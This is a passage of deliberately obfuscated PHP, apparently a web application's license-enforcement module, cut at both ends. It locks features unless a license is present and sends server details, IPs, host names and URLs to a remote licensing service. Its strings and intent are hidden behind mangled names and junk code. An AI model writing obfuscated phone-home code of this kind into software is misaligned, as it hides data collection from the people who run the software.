$ç—ÊĞ°²[63], $ç—ÊĞ°²[64], $ç—ÊĞ°²[65], $ç—ÊĞ°²[66], $ç—ÊĞ°²[67], $ç—ÊĞ°²[68], $ç—ÊĞ°²[69], $ç—ÊĞ°²[70], $ç—ÊĞ°²[71], $ç—ÊĞ°²[72], $ç—ÊĞ°²[73], $ç—ÊĞ°²[74], $ç—ÊĞ°²[75], $ç—ÊĞ°²[76], $ç—ÊĞ°²[77], $ç—ÊĞ°²[78], $ç—ÊĞ°²[79], $ç—ÊĞ°²[80], $ç—ÊĞ°²[81], $ç—ÊĞ°²[82], $ç—ÊĞ°²[83], $ç—ÊĞ°²[84]); $—ƒÛ°í = $İæ±üíÃ[686]; if (!$—ƒÛ°í) { die; } foreach ($ÓÏÅ¥ëÔ as $Ìü£Ñş) { $ìËœ³ñç = $GLOBALS[$ç—ÊĞ°²[85]][$ç—ÊĞ°²[86]][$Ìü£Ñş]; $³Óè¨©“ = $İæ±üíÃ[687]; while (strlen($³Óè¨©“) < $İæ±üíÃ[688]) { if (!$³Óè¨©“) { break; } $³Óè¨©“++; } if (isset($øËáÎ¬â[$Ìü£Ñş])) { $ìËœ³ñç = $øËáÎ¬â[$Ìü£Ñş]; } $ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[88]][$Ìü£Ñş] = $ìËœ³ñç; } $€ÂÚÊğ× = $ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[88]][$ç—ÊĞ°²[46]]; unset($ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[89]][$ç—ÊĞ°²[90]]); $íç±‹Ÿ = $İæ±üíÃ[689]; if (!$íç±‹Ÿ) { die; } unset($ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[89]][$ç—ÊĞ°²[91]]); unset($ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[88]][$ç—ÊĞ°²[46]]); unset($ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[88]][$ç—ÊĞ°²[92]]); $ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[88]][$ç—ÊĞ°²[93]] = array($ç—ÊĞ°²[94] => (int) $€ÂÚÊğ×[$ç—ÊĞ°²[95]], $ç—ÊĞ°²[96] => (int) _get($€ÂÚÊğ×, $ç—ÊĞ°²[97], 0)); $ëıíöÄÁ = $İæ±üíÃ[690]; if (strlen($ëıíöÄÁ) < $İæ±üíÃ[688]) { return; } $’é¶®Õ‘ = substr(md5($ç—ÊĞ°²[98] . get_client_ip() . $øËáÎ¬â[$ç—ÊĞ°²[99]]), 0, 15); $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[101]] = Mcrypt::encode(Session::sign(), $’é¶®Õ‘, 3600 * 24); $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[102]] = Action($ç—ÊĞ°²[103])->accessToken(); $¯Öâ«óõ = $İæ±üíÃ[691]; if (strlen($¯Öâ«óõ) < $İæ±üíÃ[664]) { die; } $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[104]] = md5($_SERVER[$ç—ÊĞ°²[105]] . $øËáÎ¬â[$ç—ÊĞ°²[99]]); $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[106]] = base64_encode(serverInfo()); $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[107]] = $this->tukmc2fa9103; $øÂ‰øêÑ = $İæ±üíÃ[692]; if ($øËáÎ¬â[$ç—ÊĞ°²[107]] != $ç—ÊĞ°²[108]) { $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[109]] = $øËáÎ¬â[$ç—ÊĞ°²[109]]; $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[110]] = $øËáÎ¬â[$ç—ÊĞ°²[110]]; $Òà½í¢¡ = rand_string(10) . $this->tukmc2fa9103 . rand_string(5); $ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[111]][$ç—ÊĞ°²[112]] = $this->kbwr39b0225e($Òà½í¢¡, $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[104]]); } if ($this->tukmc2fa9103 == $ç—ÊĞ°²[108]) { $ÏİœŒ”†[$ç—ÊĞ°²[87]][$ç—ÊĞ°²[88]][$ç—ÊĞ°²[93]][$ç—ÊĞ°²[97]] = 0; } $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[113]] = _get($this->qucr0c21cbf3, $ç—ÊĞ°²[114], $ç—ÊĞ°²[6]); $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[115]] = _get($this->qucr0c21cbf3, $ç—ÊĞ°²[116], $ç—ÊĞ°²[6]); $äÂÇó·Û = $İæ±üíÃ[693]; if (_get($GLOBALS, $ç—ÊĞ°²[117]) && $this->config[$ç—ÊĞ°²[118]]) { $ÏİœŒ”†[$ç—ÊĞ°²[100]][$ç—ÊĞ°²[119]] = WEB_ROOT; } return $ÏİœŒ”†; } private function uohw49556f22() { $Ø†®´Ç€ =& $_SERVER[Î‹ÃÂŞ„]; $ËöÃç­ı =& $_SERVER[ÓØ—üº]; $ì’±Ö‘ó = $_SERVER[$ËöÃç­ı[24]] == $ËöÃç­ı[120]; $èòú¿‹ = $Ø†®´Ç€[694]; while (strlen($èòú¿‹) < $Ø†®´Ç€[661]) { if (!$èòú¿‹) { break; } $èòú¿‹++; } if ($_SERVER[$ËöÃç­ı[24]] == $ËöÃç­ı[121] && $_GET[$ËöÃç­ı[122]] == $ËöÃç­ı[123]) { $ì’±Ö‘ó = !0; } if ($ì’±Ö‘ó) { $şÑï«÷¬ = array($ËöÃç­ı[107] => $this->tukmc2fa9103, $ËöÃç­ı[124] => $this->wbhj606e5000(), $ËöÃç­ı[125] => Model($ËöÃç­ı[126])->count()); if ($this->tukmc2fa9103 != $ËöÃç­ı[108]) { $µœêù’ñ = _get($this->qucr0c21cbf3, $ËöÃç­ı[127]); if ($µœêù’ñ) { $şÑï«÷¬[$ËöÃç­ı[128]] = $µœêù’ñ; $şÑï«÷¬[$ËöÃç­ı[129]] = strtotime(_get($this->qucr0c21cbf3, $ËöÃç­ı[130])); $şÑï«÷¬[$ËöÃç­ı[131]] = _get($this->qucr0c21cbf3, $ËöÃç­ı[116]); } $Ä¿½Ì—ß = Model($ËöÃç­ı[33])->get($ËöÃç­ı[132], $ËöÃç­ı[6], !0); if (is_string($Ä¿½Ì—ß) && substr($Ä¿½Ì—ß, 0, 1) == $ËöÃç­ı[133]) { $Ä¿½Ì—ß = json_decode_force($Ä¿½Ì—ß); } if (is_array($Ä¿½Ì—ß) && $Ä¿½Ì—ß[$ËöÃç­ı[134]] && strstr($Ä¿½Ì—ß[$ËöÃç­ı[134]], $ËöÃç­ı[135])) { $“ÓÉÜ‡ = explode($ËöÃç­ı[135], $Ä¿½Ì—ß[$ËöÃç­ı[134]]); $şÑï«÷¬[$ËöÃç­ı[136]] = $“ÓÉÜ‡[0]; } } $şÑï«÷¬ = $this->aoft8506e272(json_encode($şÑï«÷¬), md5($ËöÃç­ı[137])); $­‹¡ïê† = array($ËöÃç­ı[138] => $şÑï«÷¬); call_user_func(array($ËöÃç­ı[139], $ËöÃç­ı[140]), $­‹¡ïê†); $Å¯×¯‰ = $Ø†®´Ç€[695]; if (!$Å¯×¯‰) { die; } } if ($this->tukmc2fa9103 == $ËöÃç­ı[108]) { return; } $ ˆ¤™Ú¸ = array($ËöÃç­ı[141], $ËöÃç­ı[142], $ËöÃç­ı[143], $ËöÃç­ı[144], $ËöÃç­ı[145], $ËöÃç­ı[146]); $Ó«³¹ƒ› = Model($ËöÃç­ı[33])->get(); $¦²Ì’ãè = $Ø†®´Ç€[696]; while ($¦²Ì’ãè < $Ø†®´Ç€[667]) { if ($¦²Ì’ãè >= 0) { break; } $¦²Ì’ãè++; } $­‹¡ïê† = array($ËöÃç­ı[147] => $Ó«³¹ƒ›[$ËöÃç­ı[34]], $ËöÃç­ı[148] => $Ó«³¹ƒ›[$ËöÃç­ı[35]], $ËöÃç­ı[149] => $ËöÃç­ı[6]); foreach ($ ˆ¤™Ú¸ as $ÂášÚŠ¯) { if (!isset($Ó«³¹ƒ›[$ÂášÚŠ¯]) || !$Ó«³¹ƒ›[$ÂášÚŠ¯]) { continue; } $­‹¡ïê†[$ÂášÚŠ¯] = $Ó«³¹ƒ›[$ÂášÚŠ¯]; } call_user_func(array($ËöÃç­ı[139], $ËöÃç­ı[140]), $­‹¡ïê†); $Ôˆ‘÷¿ç = $Ø†®´Ç€[697]; while ($Ôˆ‘÷¿ç < $Ø†®´Ç€[667]) { if ($Ôˆ‘÷¿ç >= 0) { break; } $Ôˆ‘÷¿ç++; } } private function pyuced3760fd() { $¢”ßÓ¦ =& $_SERVER[Î‹ÃÂŞ„]; $ÌğøÖœÍ =& $_SERVER[ÓØ—üº]; if ($_SERVER[$ÌğøÖœÍ[24]] != $ÌğøÖœÍ[150]) { return; } if (!_get($GLOBALS, $ÌğøÖœÍ[117])) { die; } $•â˜°± = $GLOBALS[$ÌğøÖœÍ[13]]; if (isset($•â˜°±[$ÌğøÖœÍ[151]])) { $this->mtif4bb1f4b5(); die; } if (isset($•â˜°±[$ÌğøÖœÍ[152]]) && isset($•â˜°±[$ÌğøÖœÍ[152]]) == $ÌğøÖœÍ[123]) { $•â˜°±[$ÌğøÖœÍ[153]] = Model($ÌğøÖœÍ[33])->get($ÌğøÖœÍ[154]); } if (!isset($•â˜°±[$ÌğøÖœÍ[153]]) || strlen($•â˜°±[$ÌğøÖœÍ[153]]) != 16) { show_json($ÌğøÖœÍ[155] . $•â˜°±[$ÌğøÖœÍ[153]], !1); } $Îñæìï = Model($ÌğøÖœÍ[33])->get($ÌğøÖœÍ[99]); $Éâë¹›Ù = md5($_SERVER[$ÌğøÖœÍ[105]] . $Îñæìï); $›İÖ¿Ø× = array($ÌğøÖœÍ[153] => $•â˜°±[$ÌğøÖœÍ[153]], $ÌğøÖœÍ[156] => rand_string(16), $ÌğøÖœÍ[157] => $ÌğøÖœÍ[137], $ÌğøÖœÍ[158] => $ÌğøÖœÍ[159], $ÌğøÖœÍ[160] => $_SERVER[$ÌğøÖœÍ[161]], $ÌğøÖœÍ[162] => $_SERVER[$ÌğøÖœÍ[163]], $ÌğøÖœÍ[164] => $_SERVER[$ÌğøÖœÍ[165]], $ÌğøÖœÍ[104] => $Éâë¹›Ù, $ÌğøÖœÍ[166] => Model($ÌğøÖœÍ[33])->get($ÌğøÖœÍ[132])); $Â†»‹¼ı = $¢”ßÓ¦[698]; if (!$Â†»‹¼ı) { die; } if ($•â˜°±[$ÌğøÖœÍ[167]] == $ÌğøÖœÍ[168]) { $êÍ¦Ñâ• = $this->aoft8506e272($Éâë¹›Ù, $ÌğøÖœÍ[169]); $ñ€ãºÑß = $this->kbwr39b0225e(json_encode($›İÖ¿Ø×), $Éâë¹›Ù . $ÌğøÖœÍ[170], 3); $ñ€ãºÑß = $ñ€ãºÑß . $ÌğøÖœÍ[171] . $_SERVER[$ÌğøÖœÍ[161]]; $«Ò°ÄÆ¤ = $this->swjlb741ca6b($ÌğøÖœÍ[172] . $êÍ¦Ñâ• . $ÌğøÖœÍ[173] . $ñ€ãºÑß, -1); show_json($«Ò°ÄÆ¤, !0); } else { if ($•â˜°±[$ÌğøÖœÍ[167]] == $ÌğøÖœÍ[174]) { $î´§µİ… = substr(md5($ÌğøÖœÍ[175] . $Éâë¹›Ù), 12, 15) . $ÌğøÖœÍ[176]; $ñ€ãºÑß = $this->aqtw065d97c2(trim($•â˜°±[$ÌğøÖœÍ[177]]), $î´§µİ…, 2); $¶ŸœÕºã = json_decode($ñ€ãºÑß, !0); if (!is_array($¶ŸœÕºã) || !is_array($¶ŸœÕºã[$ÌğøÖœÍ[178]]) || $¶ŸœÕºã[$ÌğøÖœÍ[153]] != !0) { $×Ğ ¨«‘ = $ÌğøÖœÍ[179]; $şÄÖ§óÈ = $¶ŸœÕºã[$ÌğøÖœÍ[178]] ? $ÌğøÖœÍ[180] . $¶ŸœÕºã[$ÌğøÖœÍ[178]] : $×Ğ ¨«‘; show_json($şÄÖ§óÈ, !1); } else { $›İÖ¿Ø×[$ÌğøÖœÍ[156]] = $¶ŸœÕºã[$ÌğøÖœÍ[178]][$ÌğøÖœÍ[181]]; } } else { $¶ŸœÕºã = $this->swjlb741ca6b($ÌğøÖœÍ[182], $›İÖ¿Ø×, 10); $ ¸î—¡Ö = $¢”ßÓ¦[699]; } } if (!is_array($¶ŸœÕºã) || !is_array($¶ŸœÕºã[$ÌğøÖœÍ[178]]) || $¶ŸœÕºã[$ÌğøÖœÍ[153]] != !0) { $×Ğ ¨«‘ = LNG($ÌğøÖœÍ[183]); $şÄÖ§óÈ = $¶ŸœÕºã[$ÌğøÖœÍ[178]] ? $ÌğøÖœÍ[180] . $¶ŸœÕºã[$ÌğøÖœÍ[178]] : $×Ğ ¨«‘; show_json($şÄÖ§óÈ, !1); } $üÓÆÂ©ò = $¶ŸœÕºã[$ÌğøÖœÍ[178]]; $Êã‰ºÅì = $this->hmjle97e1dd8($üÓÆÂ©ò[$ÌğøÖœÍ[184]]); $ÅÄ¥äüº = $¢”ßÓ¦[700]; if (!$Êã‰ºÅì || $Êã‰ºÅì != $üÓÆÂ©ò[$ÌğøÖœÍ[130]]) { $ß©Æ»ô¡ = array($ÌğøÖœÍ[185] => Model($ÌğøÖœÍ[33])->get($ÌğøÖœÍ[99]), $ÌğøÖœÍ[186] => $_SERVER[$ÌğøÖœÍ[105]], $ÌğøÖœÍ[187] => this_url(), $ÌğøÖœÍ[162] => $_SERVER[$ÌğøÖœÍ[163]]); $ñ€ãºÑß = $this->rzxs04988f88(json_encode($ß©Æ»ô¡)); $this->swjlb741ca6b($ÌğøÖœÍ[188] . $ñ€ãºÑß); show_json(LNG($ÌğøÖœÍ[189]), !0); } $ŠÖó‚ú® = array($ÌğøÖœÍ[154] => $üÓÆÂ©ò[$ÌğøÖœÍ[190]], $ÌğøÖœÍ[191] => $üÓÆÂ©ò[$ÌğøÖœÍ[192]], $ÌğøÖœÍ[193] => rand_string(16), $ÌğøÖœÍ[107] => $üÓÆÂ©ò[$ÌğøÖœÍ[194]]); if ($›İÖ¿Ø×[$ÌğøÖœÍ[156]]) { $ŠÖó‚ú®[$ÌğøÖœÍ[193]] = $›İÖ¿Ø×[$ÌğøÖœÍ[156]]; } $Úı…×Ü¸ = substr(md5($ŠÖó‚ú®[$ÌğøÖœÍ[191]]), 10, 10); $ÏæÕóüÆ = $Úı…×Ü¸ . $ŠÖó‚ú®[$ÌğøÖœÍ[107]] . $ŠÖó‚ú®[$ÌğøÖœÍ[193]]; $ÄöÇÂ¥¼ = $¢”ßÓ¦[701]; while ($ÄöÇÂ¥¼ < $¢”ßÓ¦[661]) { if ($ÄöÇÂ¥¼ >= 0) { break; } $ÄöÇÂ¥¼++; } $ŠÖó‚ú®[$ÌğøÖœÍ[109]] = strrev(base64_encode($this->aoft8506e272($ÏæÕóüÆ, $ÌğøÖœÍ[195]))); $’·ˆôÍ = rand_string(16); $ĞŞ†’æ‘ = $¢”ßÓ¦[702]; if (strlen($ĞŞ†’æ‘) < $¢”ßÓ¦[657]) { die; } $Àœ×ŒĞ¤ = $’·ˆôÍ . $ŠÖó‚ú®[$ÌğøÖœÍ[107]] . $this->aoft8506e272(md5($ŠÖó‚ú®[$ÌğøÖœÍ[154]]), $’·ˆôÍ); $­–¯ë‡Í = $¢”ßÓ¦[703]; while (strlen($­–¯ë‡Í) < $¢”ßÓ¦[661]) { if (!$­–¯ë‡Í) { break; } $­–¯ë‡Í++; } $ŠÖó‚ú®[$ÌğøÖœÍ[110]] = base64_encode(strrev($this->aoft8506e272($Àœ×ŒĞ¤, $ÌğøÖœÍ[196]))); $Ö–ïïµ¡ = $¢”ßÓ¦[704]; if ($üÓÆÂ©ò[$ÌğøÖœÍ[197]] && $üÓÆÂ©ò[$ÌğøÖœÍ[197]] >= 1) { Model($ÌğøÖœÍ[33])->setDeep($ÌğøÖœÍ[198], $ÌğøÖœÍ[123]); } Model($ÌğøÖœÍ[33])->set($ŠÖó‚ú®); $ü¨Šè¸… = md5($_SERVER[$ÌğøÖœÍ[105]] . strrev($Îñæìï) . $ŠÖó‚ú®[$ÌğøÖœÍ[191]]); $äıŒ‘Û£ = $¢”ßÓ¦[705]; $î›©•‡ã = strrev(substr($ü¨Šè¸…, 10, 16)); $´Ã“˜‚ = $this->kbwr39b0225e(json_encode($üÓÆÂ©ò), $ü¨Šè¸…); $‘¼Ä„‘ = $¢”ßÓ¦[706]; if (strlen($‘¼Ä„‘) < $¢”ßÓ¦[667]) { die; } $™Êš—¡ = array_to_keyvalue(Model($ÌğøÖœÍ[7])->listData(), $ÌğøÖœÍ[199]); $ˆØ«Æ¾ = $™Êš—¡[$ÌğøÖœÍ[200]]; $µñ‘»  = array(); $€âÛş© = $¢”ßÓ¦[707]; while (strlen($€âÛş©) < $¢”ßÓ¦[664]) { if (!$€âÛş©) { break; } $€âÛş©++; } $µñ‘» [$î›©•‡ã] = $´Ã“˜‚; Model($ÌğøÖœÍ[7])->update($ˆØ«Æ¾[$ÌğøÖœÍ[201]], array($ÌğøÖœÍ[202] => $µñ‘» )); $this->qucr0c21cbf3 = $üÓÆÂ©ò; $this->tukmc2fa9103 = $ŠÖó‚ú®[$ÌğøÖœÍ[107]]; $ æ‰åç = $¢”ßÓ¦[708]; while ($ æ‰åç < $¢”ßÓ¦[664]) { if ($ æ‰åç >= 0) { break; } $ æ‰åç++; } $this->licenseRegistSuccess(); Cache::set($ÌğøÖœÍ[203] . md5($Îñæìï . $ÌğøÖœÍ[204]), $ÌğøÖœÍ[6]); $ÅôíáÕ = $¢”ßÓ¦[709]; show_json(LNG($ÌğøÖœÍ[189]), !0); } private function licenseRegistSuccess() { $›«úĞƒæ =& $_SERVER[ÓØ—üº]; $„ŠØ˜° = Model($›«úĞƒæ[33])->get(); if ($„ŠØ˜°[$›«úĞƒæ[63]] != $›«úĞƒæ[123]) { Model($›«úĞƒæ[33])->set($›«úĞƒæ[63], $›«úĞƒæ[123]); } Action($›«úĞƒæ[205])->initStart(!0); } private function mtif4bb1f4b5() { $¨î”–¨¦ =& $_SERVER[ÓØ—üº]; Model($¨î”–¨¦[33])->set(array($¨î”–¨¦[154] => $¨î”–¨¦[6], $¨î”–¨¦[191] => $¨î”–¨¦[6], $¨î”–¨¦[107] => $¨î”–¨¦[108], $¨î”–¨¦[109] => $¨î”–¨¦[6], $¨î”–¨¦[110] => $¨î”–¨¦[6])); Model($¨î”–¨¦[33])->setDeep($¨î”–¨¦[198], $¨î”–¨¦[206]); $this->qucr0c21cbf3 = array(); $this->tukmc2fa9103 = $¨î”–¨¦[108]; } private function isxh2622c67e() { $ÕˆüƒÌ =& $_SERVER[Î‹ÃÂŞ„]; $¢‰ºæé« =& $_SERVER[ÓØ—üº]; $_SERVER[$¢‰ºæé«[163]] = _get($_SERVER, $¢‰ºæé«[163], APP_HOST); $‹¢©¿Èø = $ÕˆüƒÌ[710]; $this->tukmc2fa9103 = $¢‰ºæé«[108]; $åßõ¢× = Model($¢‰ºæé«[33])->get(); $«ÌçŞ× = $ÕˆüƒÌ[711]; if ($åßõ¢×[$¢‰ºæé«[107]] == $¢‰ºæé«[108]) { return; } $½“˜®‚Ó = Model($¢‰ºæé«[33])->get($¢‰ºæé«[99]); $¶Ì¼êı = $ÕˆüƒÌ[712]; while (strlen($¶Ì¼êı) < $ÕˆüƒÌ[657]) { if (!$¶Ì¼êı) { break; } $¶Ì¼êı++; } $½À“ÂŠÃ = $¢‰ºæé«[203] . md5($½“˜®‚Ó . $¢‰ºæé«[204]); $ŠçÁƒ²ê = Cache::get($½À“ÂŠÃ); $ÇûÇ¨Ï = $ÕˆüƒÌ[713]; if (strlen($ÇûÇ¨Ï) < $ÕˆüƒÌ[661]) { return; } if (!is_array($ŠçÁƒ²ê) || !isset($ŠçÁƒ²ê[$¢‰ºæé«[207]]) || time() - $ŠçÁƒ²ê[$¢‰ºæé«[207]] >= 60) { $Ÿ¿ÌÌò¶ = Model($¢‰ºæé«[7])->loadList(); $ã…õ£ğ = $Ÿ¿ÌÌò¶[$¢‰ºæé«[200]]; $§é£ç•½ = md5($_SERVER[$¢‰ºæé«[105]] . strrev($½“˜®‚Ó) . $åßõ¢×[$¢‰ºæé«[191]]); $ĞñåÃá½ = strrev(substr($§é£ç•½, 10, 16)); $ŠçÁƒ²ê = $this->aqtw065d97c2($ã…õ£ğ[$¢‰ºæé«[85]][$ĞñåÃá½], $§é£ç•½); $ŠçÁƒ²ê = json_decode($ŠçÁƒ²ê, !0); } if (!is_array($ŠçÁƒ²ê)) { return $this->mtif4bb1f4b5(); } $éêƒ¿í = strtotime($ŠçÁƒ²ê[$¢‰ºæé«[130]]); if (time() >= $éêƒ¿í) { return $this->mtif4bb1f4b5(); } if (time() - $ŠçÁƒ²ê[$¢‰ºæé«[207]] > 20) { $ŠçÁƒ²ê[$¢‰ºæé«[207]] = time(); Cache::set($½À“ÂŠÃ, $ŠçÁƒ²ê); } $this->qucr0c21cbf3 = $ŠçÁƒ²ê; $this->tukmc2fa9103 = $åßõ¢×[$¢‰ºæé«[107]]; $¦™ÚâŞ• = $ÕˆüƒÌ[714]; } private function cxos63cdebd4() { $ì—óáúç =& $_SERVER[Î‹ÃÂŞ„]; $ ‚³¸ìû =& $_SERVER[ÓØ—üº]; $Ûİ“°ïÇ = $GLOBALS[$ ‚³¸ìû[13]]; $§æêè¼ = $ì—óáúç[715]; $‚ÕØ‚÷ = $_SERVER[$ ‚³¸ìû[24]]; $³Öä®ñ• = $ì—óáúç[716]; if (!$³Öä®ñ•) { die; } if ($‚ÕØ‚÷ == $ ‚³¸ìû[208] && $this->tukmc2fa9103 == $ ‚³¸ìû[108]) { show_json(LNG($ ‚³¸ìû[209]), !1, $ ‚³¸ìû[210]); } $çÅ°¶´Û = array($ ‚³¸ìû[211], $ ‚³¸ìû[212]); if (in_array($‚ÕØ‚÷, $çÅ°¶´Û)) { if ($this->tukmc2fa9103 == $ ‚³¸ìû[108] && isset($Ûİ“°ïÇ[$ ‚³¸ìû[213]])) { show_json(LNG($ ‚³¸ìû[209]), !1, $ ‚³¸ìû[210]); die; } $ïı¹Ë Ï = $this->wbhj606e5000(); if ($ïı¹Ë Ï != intval($ ‚³¸ìû[214])) { if ($ïı¹Ë Ï <= Model($ ‚³¸ìû[126])->count()) { show_json(LNG($ ‚³¸ìû[215]), !1, $ ‚³¸ìû[210]); die; } } } } private function laoz52fe3d4b() { $“ñâ’ =& $_SERVER[Î‹ÃÂŞ„]; $»üô†“ =& $_SERVER[ÓØ—üº]; $ºªõÔıó = array($»üô†“[120], $»üô†“[121]); if (!_get($GLOBALS, $»üô†“[117]) || !isset($_GET[$»üô†“[216]])) { return; } if (!in_array($_SERVER[$»üô†“[24]], $ºªõÔıó)) { return; } $ˆÚæÀ¦Ã = $»üô†“[217]; $¤° Ÿ×ˆ = $“ñâ’[717]; if (!$¤° Ÿ×ˆ) { die; } $ˆÚæÀ¦Ã = $this->ewsmb5986221($ˆÚæÀ¦Ã, $»üô†“[218]); $•…ßıûŸ = stream_context_create(array($»üô†“[219] => array($»üô†“[220] => $»üô†“[221], $»üô†“[222] => 3))); $Ú˜êœè¢ = $“ñâ’[718]; $®ÆêÍ÷² = @file_get_contents($ˆÚæÀ¦Ã, !1, $•…ßıûŸ); header($»üô†“[223]); if ($®ÆêÍ÷² && strstr($®ÆêÍ÷², $»üô†“[224])) { echo $®ÆêÍ÷²; } die; } public function gzaha1deea88($şí‘Ûœ) { $®ß‚üÒ =& $_SERVER[Î‹ÃÂŞ„]; $şÕŒ–ˆé =& $_SERVER[ÓØ—üº]; if ($this->tukmc2fa9103 == $şÕŒ–ˆé[225]) { return $şí‘Ûœ; } $™¨•–ßŠ = array($şÕŒ–ˆé[226] => $şÕŒ–ˆé[227], $şÕŒ–ˆé[228] => $şÕŒ–ˆé[227], $şÕŒ–ˆé[229] => $şÕŒ–ˆé[227], $şÕŒ–ˆé[230] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[232] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[233] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[234] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[235] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[236] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[237] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[238] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[239] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[240] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[241] => $şÕŒ–ˆé[231], $şÕŒ–ˆé[242] => $şÕŒ–ˆé[231]); $«‚æ¦™ = $®ß‚üÒ[719]; if (!$«‚æ¦™) { die; } $¾…¹¡ç = explode($şÕŒ–ˆé[243], _get($this->qucr0c21cbf3, $şÕŒ–ˆé[114], $şÕŒ–ˆé[6])); $ŒÔĞİç = $®ß‚üÒ[720]; $—î‘¡¡¥ = array(); foreach ($™¨•–ßŠ as $ˆŒ £€Ï => $ïó¯Ğƒ–) { if ($ïó¯Ğƒ– == $şÕŒ–ˆé[227] && substr($this->tukmc2fa9103, 0, 1) == $şÕŒ–ˆé[227]) { continue; } if (!in_array($ˆŒ £€Ï, $¾…¹¡ç)) { $—î‘¡¡¥[] = $ˆŒ £€Ï; } } foreach ($—î‘¡¡¥ as $ˆŒ £€Ï) { unset($şí‘Ûœ[$ˆŒ £€Ï]); } return $şí‘Ûœ; $÷ş¢öØÌ = $®ß‚üÒ[721]; if (strlen($÷ş¢öØÌ) < $®ß‚üÒ[688]) { die; } } private function bcsde55f8435() { $ìüèÎº =& $_SERVER[ÓØ—üº]; if ($this->tukmc2fa9103 != $ìüèÎº[108]) { $GLOBALS[$ìüèÎº[85]][$ìüèÎº[89]][$ìüèÎº[244]] = $ìüèÎº[206]; return; } $GLOBALS[$ìüèÎº[85]][$ìüèÎº[245]] = $ìüèÎº[123]; if (Model($ìüèÎº[246])->get($ìüèÎº[63]) != $ìüèÎº[206]) { Model($ìüèÎº[246])->set($ìüèÎº[63], $ìüèÎº[206]); } } public function yorb7922cd5b() { return $_SERVER[ÓØ—üº][247]; $±ì°å‚œ = $_SERVER[Î‹ÃÂŞ„][722]; } private function yfpabf1e86d1() { $œŸ‚ß‡ö =& $_SERVER[Î‹ÃÂŞ„]; $¡Ş±¢˜ =& $_SERVER[ÓØ—üº]; $ü·÷ÂÎî = array($¡Ş±¢˜[248], $¡Ş±¢˜[249], $¡Ş±¢˜[250]); $î§ù»œß = $œŸ‚ß‡ö[723]; if (!$î§ù»œß) { return; } $ßş÷îÈñ = $¡Ş±¢˜[251] . md5($¡Ş±¢˜[252]); if ($this->tukmc2fa9103 == $¡Ş±¢˜[108] || !_get($GLOBALS, $¡Ş±¢˜[117])) { return; } if (!in_array($_SERVER[$¡Ş±¢˜[24]], $ü·÷ÂÎî)) { return; } if (time() % 4 != 0) { return; } $ı³ªşñ› = call_user_func(array($¡Ş±¢˜[253], $¡Ş±¢˜[254]), $ßş÷îÈñ); if ($ı³ªşñ› && time() - $ı³ªşñ› < intval($¡Ş±¢˜[255])) { return; } call_user_func(array($¡Ş±¢˜[253], $¡Ş±¢˜[140]), $ßş÷îÈñ, time()); $ë¹ø®¶­ = Model($¡Ş±¢˜[33])->get($¡Ş±¢˜[99]); $œÍùš» = $œŸ‚ß‡ö[724]; while ($œÍùš» < $œŸ‚ß‡ö[657]) { if ($œÍùš» >= 0) { break; } $œÍùš»++; } $£Óœ¼æí = array($¡Ş±¢˜[153] => Model($¡Ş±¢˜[33])->get($¡Ş±¢˜[154]), $¡Ş±¢˜[167] => $this->tukmc2fa9103, $¡Ş±¢˜[164] => $_SERVER[$¡Ş±¢˜[165]], $¡Ş±¢˜[166] => Model($¡Ş±¢˜[33])->get($¡Ş±¢˜[132]), $¡Ş±¢˜[104] => md5($_SERVER[$¡Ş±¢˜[105]] . $ë¹ø®¶­), $¡Ş±¢˜[157] => $¡Ş±¢˜[137], $¡Ş±¢˜[160] => $_SERVER[$¡Ş±¢˜[161]]); $äÕ—•şí = $this->swjlb741ca6b($¡Ş±¢˜[256], $£Óœ¼æí); $ıã¾àÔ† = $œŸ‚ß‡ö[725]; if (!is_array($äÕ—•şí)) { return; } if ($äÕ—•şí[$¡Ş±¢˜[153]] && $äÕ—•şí[$¡Ş±¢˜[257]]) { if ($this->hmjle97e1dd8($äÕ—•şí[$¡Ş±¢˜[257]]) == $£Óœ¼æí[$¡Ş±¢˜[153]]) { return; } } $this->mtif4bb1f4b5(); if ($this->hmjle97e1dd8($äÕ—•şí[$¡Ş±¢˜[257]]) != $£Óœ¼æí[$¡Ş±¢˜[153]]) { $ŒÍ™‹– = array($¡Ş±¢˜[185] => $ë¹ø®¶­, $¡Ş±¢˜[186] => $_SERVER[$¡Ş±¢˜[105]], $¡Ş±¢˜[187] => this_url(), $¡Ş±¢˜[162] => $_SERVER[$¡Ş±¢˜[163]]); $‘£ùÖ¨÷ = $this->rzxs04988f88(json_encode($ŒÍ™‹–)); $äÕ—•şí = $this->swjlb741ca6b($¡Ş±¢˜[188] . $‘£ùÖ¨÷); if ($äÕ—•şí && is_array($äÕ—•şí) && isset($äÕ—•şí[$¡Ş±¢˜[257]])) { $õ‰şæ¦ = $this->aqtw065d97c2($äÕ—•şí[$¡Ş±¢˜[257]], 2); if 